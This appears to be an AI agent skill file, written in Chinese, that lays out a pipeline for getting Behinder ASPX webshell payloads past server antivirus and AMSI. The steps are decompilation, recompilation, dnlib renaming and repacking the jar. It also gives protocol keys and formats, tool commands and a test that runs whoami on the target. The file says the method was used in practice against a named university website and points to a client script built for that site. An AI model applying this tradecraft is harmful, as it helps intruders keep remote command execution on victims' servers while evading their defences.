---
name: behinder-aspx-av-bypass
description: "冰蝎ASPX马被服务器杀软拦(0x800700E1病毒错误)时: 反编译→重编译→dnlib改名免杀载荷。"
version: 1.0.0
metadata:
  hermes:
    tags: [pentest, webshell, behinder, av-bypass, aspx, amsi]
---

# 冰蝎4.x ASPX 载荷免杀流水线

## 触发条件
冰蝎马突然连不上, 服务器返回 500, 错误页出现:
`BadImageFormatException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. (Exception from HRESULT: 0x800700E1)`
= 服务器杀软(AMSI)在 `Assembly.Load` 加载**解密后的载荷**时按签名拦截。马文件本身没死(自定义 U.dll 载荷能通 = 铁证)。

## 冰蝎4.0.6 协议事实(诊断必需)
- 密钥 = `MD5(密码).hexdigest()[:16]` 的 ASCII 字节 (默认密码 rebeyond → e45e329feb5d925b)
- 传输: 裸二进制 POST body + AES-128-CBC(IV=密钥, PKCS7)
- 载荷协议: body = `[载荷DLL字节] + "~~~~~~"(0x7E×6) + "字段名:base64(值),..."` 整体加密
  - DLL 内必须含一个 0x7E×6 标记(编译器自动嵌入, 代码里写 `new byte[]{126,126,126,126,126,126}` 即可); 载荷按**第二次出现**的位置切分
- 载荷按**字段名**反射赋值 (`GetType().GetField(key).SetValue`), 所以 cmd/path/sessionId 等字段名**不能改**
- 响应 = 壳前缀 `Welcome You!<html>\n</html>\n{;}\n` + 加密JSON(值 base64)
- 服务器 shell 侧: `Session.Add("k",密钥)` + `Session[0]` + `Request.BinaryRead` + `Assembly.Load(decrypted).CreateInstance("U").Equals(this)`

## 免杀流水线(2026-08 实战验证, uscrec/rec.usc.edu.ph)
杀软匹配的是**结构+IL**, 单改时间戳/字符串/NOP 都不够, 必须: 重编译(IL全变) + dnlib改名(结构变)。

### 工具链(全部本地/下载即可)
- 反编译: ICSharpCode.Decompiler **7.2.1.6856** (netstandard2.0, PowerShell 5.1 可加载)
  - 依赖: System.Reflection.Metadata/5.0.0, System.Collections.Immutable/5.0.0, System.Memory/4.5.5, System.Runtime.CompilerServices.Unsafe/5.0.0 (全部 lib/netstandard2.0)
  - 下载: `https://www.nuget.org/api/v2/package/<Pkg>/<版本号>` (.nupkg 即 zip)
  - 注意版本号带 4 段: 7.2.1.6856, 不是 7.2.1
- 编译: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe` (只支持C#5!)
  - C#6/7 语法要手动降级: `$"..."` 插值→string.Format; `using X x = new X();` 声明→普通声明
  - Roslyn csc(NuGet Microsoft.Net.Compilers) 在本机环境会崩(RC=35), 别用
- 改名: dnlib **4.5.0** (lib/netstandard2.0, PS 5.1 加载)
- 载荷来源: Behinder.jar 内 `net/rebeyond/behinder/payload/csharp/*.dll`

### 步骤
1. 解压 jar 抽载荷: `unzip -o -q Behinder.jar "net/rebeyond/behinder/payload/csharp/*"`
2. PS 反编译全部 DLL → .cs (CSharpDecompiler.DecompileWholeModuleAsString, UTF8-BOM 写盘)
3. Python 修 C#5 兼容(using声明→普通声明; 插值→string.Format)
4. csc 重编译: `/nologo /target:library /optimize+` + `/r:` System/System.Core/System.Web/System.Xml 等 (csc 输出 GBK, subprocess 要 bytes 解码)
5. dnlib 改名(PS): 对每个 DLL
   - 字段改名: Request/Response/Session/Application/page → 随机名 (客户端不设这些)
   - 方法改名: 除 Equals/.ctor 外全部 → 随机名
   - 保留: 类名 U, 字段 cmd/path/sessionId 等客户端会设的字段
   - 程序集名/模块名随机 + MVID 重生成
6. 验证(必须): 迷你客户端发 `[DLL+~~~~~~+cmd:base64(whoami)]` → 期望: 非病毒错误 + 解密出 JSON msg=whoami输出
7. 打包回 jar: Python zipfile 替换对应 entry (先备份原 jar)
8. 用户彻底退出冰蝎(确认 javaw 进程消失)再重开, 否则 db/jar 被覆盖

### 迷你客户端要点
- 剥前缀 `Welcome You!<html>\n</html>\n{;}\n` 再解密响应
- 响应 PKCS7 剥除后 AES-CBC 解密 → JSON, 值 base64
- 实测模板: D:\Pentest\渗透\usc_rec_菲律宾\usc_mini_behinder2.py

## 坑
- dnSpy.Console 在 git-bash/重定向下崩(SetConsoleOutputEncoding), 别折腾
- PS 5.1 脚本必须纯 ASCII(无BOM中文会解析错)
- git-bash 跑原生 exe 用反斜杠路径; cmd //c 里 /d 会被 MSYS 转成盘符
- dnfile 0.18 API: 表名是 MethodDef/Field, TypeDef.FieldList 是 MDTableIndex 不能直接迭代
- Database.dll 引用 MySql.Data/Oracle 编译不过 → 跳过(DB功能仍被拦, 可接受)
- 冰蝎 payload 的 Decrypt/Encrypt 会先反射找 page 上的同名方法(自定义壳), 没有才用 Session[0] 密钥
